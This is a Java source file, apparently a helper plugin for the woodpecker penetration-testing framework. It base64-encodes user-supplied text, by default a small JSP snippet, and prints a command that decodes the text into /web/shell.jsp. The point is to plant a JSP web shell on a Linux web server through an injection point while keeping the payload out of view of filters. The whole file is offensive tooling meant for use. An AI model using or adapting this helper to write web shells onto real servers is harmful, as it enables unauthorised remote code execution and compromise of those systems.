package me.gv7.woodpecker.plugin.payload;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.tools.codec.BASE64Encoder;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class LinuxBase64EchoTextConverter implements IHelper {

    @Override
    public String getHelperTabCaption() {
        return "Linux Base64 Echo To File";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = EchoTextConverter.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = EchoTextConverter.pluginHelper.createArg();
        args1.setName("all");
        args1.setDefaultValue("<%out.write(\"1\");%>");
        args1.setDescription("write text");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void doHelp(Map<String, Object> customArgs, IResultOutput iResultOutput) {
        String text = (String)customArgs.get("all");
        try {
            String payload = new BASE64Encoder().encode(text.getBytes()).replaceAll("\\s+","");
            String command = String.format("echo \"%s\"|base64 -d > /web/shell.jsp",payload);
            iResultOutput.successPrintln("Converter finish! command:");
            iResultOutput.rawPrintln("\n");
            iResultOutput.rawPrintln(command);
            iResultOutput.rawPrintln("\n");
        }catch (Exception e){}
    }
}
